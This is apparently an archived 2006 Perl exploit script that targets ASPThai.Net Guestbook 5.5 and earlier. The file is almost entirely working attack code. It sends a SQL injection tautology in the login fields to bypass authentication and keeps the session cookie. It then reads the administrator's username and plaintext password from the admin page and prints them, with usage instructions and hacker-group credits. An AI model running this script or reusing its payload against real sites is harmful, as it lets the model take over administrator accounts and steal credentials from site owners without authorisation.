<html><head><title>ASPThai.Net Guestbook <= 5.5 (Auth Bypass) SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
# SQL Injection Exploit for ASPThai.Net Guestbook &lt;= 5.5  
#(And possible higher could not find a site to test it on)
# This exploit shows the username of the administrator and the password In plain text
# Bug Found by muderskillz Coded by Zodiac
# Shouts to cijfer,uid0,|n|ex,ph4tel,z3r0,lethal, Felosi,seven,Spic and anyone else I forgot.
# http://exploitercode.com/ http://www.g00ns.net 
#irc.g00ns.net #g00ns  email = zodiac@g00ns.net
#(c) 2006

use LWP::UserAgent;
use HTTP::Cookies;

$Server = $ARGV[0];

if($Server =~m/http/g)
{
$Server=~ 'http://$Server';
print 
}
else {
  print $error;
}

if(!$Server) {usage();exit() ;}

head();

print &quot;\r\nGrabbing Username And Password\r\n\n&quot;;

#Login's and stores a cookie to view admin panel later


 $xpl = LWP::UserAgent-&gt;new() or die;
 $cookie_jar = HTTP::Cookies-&gt;new();

 $xpl-&gt;agent('g00ns');
 $xpl-&gt;cookie_jar($cookie_jar);

 $res = $xpl-&gt;post(
 $Server.'check_user.asp',
 Content =&gt; [ 

	'txtUserName' =&gt; '\' or \'%67%30%30%6e%73\'=\'%67%30%30%6e%73', 
	'txtUserPass' =&gt; '\' or \'%67%30%30%6e%73\'=\'%67%30%30%6e%73',
	'Submit' =&gt; '-= Login =-',
 ],
 );

# Create a request
my $req = HTTP::Request-&gt;new(GET =&gt; 

$Server.'change_admin_username.asp'

);

$req-&gt;header('Referer', $Server.'admin_menu.asp');

my $res = $xpl-&gt;request($req);

$info= $res-&gt;content;

if($info =~ m/Unauthorised\sAccess|The\spage\scannot\sbe\sfound/) 
{ 
 die &quot;Error Connecting...\r\n&quot;; 
}

#Check the outcome of the response

$info=~m/(value=\&quot;)(\n+|\w+|\W+)/g;
$User = $2;
$info=~m/(value=\&quot;)(\n+|\w+|\W+)/g;
$Pass= $2;

print &quot;UserName:$User\r\nPassword:$Pass\r\n&quot;;

sub head()
 {
 print &quot;\n=======================================================================\r\n&quot;;
 print &quot;* ASPThai.Net Guestbook version 5.5 SQL Injection by www.g00ns.net *\r\n&quot;;   
 print &quot;=======================================================================\r\n&quot;;
 }
sub usage()
 {
 head();
 print &quot; Usage: Thaisql.pl &lt;Site&gt;  \r\n\n&quot;;
 print &quot; &lt;Site&gt; - Full path to Guestbook e.g. http://www.site.com/guestbook/ \r\n&quot;;
 print &quot;=======================================================================\r\n&quot;;
 print &quot;   -=Coded by Zodiac, Bug Found by MurderSkillz=-\r\n&quot;;
 print &quot;www.exploitercode.com www.g00ns.net irc.g00ns.net #g00ns\r\n&quot;;
 print &quot;=======================================================================\r\n&quot;;

# milw0rm.com [2006-02-06]</pre></html>